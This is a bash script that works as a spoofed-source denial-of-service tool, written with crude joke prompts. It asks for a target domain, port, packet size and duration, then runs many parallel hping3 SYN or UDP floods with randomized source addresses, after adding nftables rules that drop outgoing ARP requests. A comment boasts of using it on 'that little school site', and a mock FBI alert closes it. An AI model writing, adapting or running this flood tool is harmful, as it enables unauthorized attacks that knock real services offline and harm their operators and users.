cat warning.txt
echo ""
read -p "Do you accept the terms to no go to ma ball? [Y/N]: " confirm
confirm=$(echo "$confirm" | tr '[:upper:]' '[:lower:]')

if [[ "$confirm" != "y" ]]; then
    echo "U ar ok to go buddy."
    exit 1
fi

read -p "What domen shuld i kill: " domain
echo "How Hard Should I Be With Ma...
sleep 2
read -p "Oh Wrong Text i Mean The Size Of Request: " size
read -p "Window Size Me. What Window Size?: " win
read -p "Port I Need To Shoot At " port
read -p "How Many Of Me Should Pee That Site: " instances
read -p "How Many Secconds Should I Pee There For: " duration

echo "TCP pooping"
echo "UDP peeing"
read -p "<T/U> " tu
tu=$(echo "$tu" | tr '[:lower:]' '[:upper:]')

echo I Use Syn Spoof Flooding To Leave Open Connections On That Little School Site So It Freaks Out Some Fire But If Your IT Is Not Useless The You Just Need To Say Me Pee no Poop.

sudo nft add table arp filter 2>/dev/null || true
sudo nft add chain arp filter output '{ type filter hook output priority 0; }' 2>/dev/null || true
sudo nft add rule arp filter output arp operation request drop 2>/dev/null || true

if [ "$tu" = "T" ]; then
    attack_cmd="sudo hping3 -d $size --syn --win $win -p $port --flood --rand-source $domain"
elif [ "$tu" = "U" ]; then
    attack_cmd="sudo hping3 -d $size --udp --win $win -p $port --flood --rand-source $domain"
else
    echo "Invalid input: must be T or U"
    sudo nft delete table arp filter 2>/dev/null || true
    exit 1
fi
echo "Doing The Shit"
(
    out=$(yes "$attack_cmd" | head -n "$instances" | parallel -j"$instances" --no-notice --tag bash -c '"{}" 2>&1 | grep "packets transmitted"')
    flood_pid=$!
    sleep "$duration"
    echo "Out Of Pee And Poop, Killing Finished"
    sudo pkill -f hping3
    sudo pkill -f "bash -c"
    wait $flood_pid 2>/dev/null
) &

wait

sudo nft delete table arp filter 2>/dev/null || true

echo -e "\033[1;31mALERT: Unauthorized access detected.\033[0m"
sleep 1
echo "This incident will be reported to the Federal Bureau of Investigation."
sleep 3
echo -e "\033[1;33mjk, calm down — unless you actually messed up and made some real shit\033[0m"
sleep 5
echo "bruh they are coming hide me"
read -rp "Press Enter To Hide Me." hide

